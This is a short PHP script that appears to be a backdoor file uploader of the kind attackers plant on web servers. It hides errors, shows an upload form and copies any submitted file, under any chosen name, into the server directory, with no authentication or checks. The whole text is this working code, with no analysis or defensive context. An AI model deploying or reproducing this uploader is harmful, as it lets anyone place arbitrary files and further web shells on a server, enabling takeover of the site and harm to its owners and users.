<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="0"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ( isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo '<b>upload success</b><br>';
    } else {
        echo '<b>upload failed! </b><br>';
    }
} else {
    ;
}
?>